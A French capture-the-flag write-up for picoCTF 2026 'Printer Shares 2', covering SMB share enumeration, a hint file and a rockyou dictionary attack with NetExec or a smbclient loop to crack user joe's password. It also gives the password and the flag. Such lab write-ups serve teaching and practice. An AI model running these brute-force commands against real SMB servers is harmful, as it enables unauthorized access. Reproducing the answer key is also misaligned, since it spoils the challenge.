# 734 — Printer Shares 2

**Événement** : picoCTF 2026 · **Catégorie** : General Skills

> Synthèse rédigée à partir des sources publiques listées en fin de fiche : ce challenge a été
> résolu côté CyLab Academy, mais le writeup d'origine n'a pas été conservé.

## Énoncé
« A Secure Printer is now in use. I'm confident no one can leak the message again... or can you? »
Suite de *Printer Shares* : le service expose du SMB et il faut retrouver le flag.

## Analyse
L'énumération anonyme (`smbclient -L //<HOST> -p <PORT> -N`) montre deux partages : `shares`
(public, invité) et `secure-shares` (« Printer for internal usage only »), dont l'accès direct est
refusé (`NT_STATUS_ACCESS_DENIED`).

Le partage public contient plusieurs fichiers ; `content.txt` et `kafka.txt` sont des leurres, mais
`notification.txt` donne l'indice décisif : un utilisateur nommé **joe** utilise encore le mot de
passe par défaut de l'imprimante. Il faut donc casser ce mot de passe sur le partage restreint.

Les writeups signalent que `hydra` (SMBv1 uniquement) et `ncrack` échouent ; les voies qui
fonctionnent sont NetExec (`nxc smb ... -u joe -p rockyou.txt`) ou une boucle `smbclient` avec
`-U 'joe%$password' -c 'ls'`. Le mot de passe trouvé est **popcorn**.

## Solution
```bash
smbclient -L //<HOST> -p <PORT> -N
smbclient //<HOST>/shares -p <PORT> -N
#   ls ; prompt OFF ; mget * ; exit
cat notification.txt
# crack (rockyou) :
nxc smb <HOST> --port <PORT> -u 'joe' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
# ou boucle smbclient avec -c 'ls'
smbclient //<HOST>/secure-shares -p <PORT> -U 'joe'
#   get flag.txt ; exit
cat flag.txt
```

## Flag
```
picoCTF{5mb_pr1nter_5h4re5_5ecure_d5e6bb0b}
```
Le suffixe varie selon l'instance : un autre writeup donne `..._5ecure_e162150b`.

## Sources
- https://picoctfsolutions.com/picoctf-2026-printer-shares-2 — page de solution picoCTF 2026 (partages, `notification.txt`, NetExec)
- https://qiita.com/8omp/items/8e1aa38aeda96fa0ecb6 — writeup picoCTF 2026 General Skills (mot de passe `popcorn`, flag complet)
- https://shukularuni.neocities.org/guide/ctf/picoctf/general/Printer_Shares_2.html — guide picoCTF/CyLab Academy (variante du flag)
